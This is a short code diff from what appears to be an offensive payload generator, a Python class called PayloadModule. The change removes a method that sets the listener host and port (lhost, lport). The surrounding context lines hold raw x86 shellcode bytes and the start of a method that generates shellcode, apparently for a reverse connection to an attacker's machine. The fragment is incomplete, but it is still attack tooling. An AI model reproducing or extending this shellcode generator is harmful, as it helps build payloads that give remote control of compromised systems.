@@ -45,11 +45,6 @@ class PayloadModule:
             "\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68" +
             "\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3")
 
-    def set_attrs(self, lport_value, lhost_value):
-        self.lport = lport_value
-        self.lhost = lhost_value
-        return
-
     def gen_shellcode(self):
         # Take the passed in attributes and gen shellcode
         ip_shellcode = ''
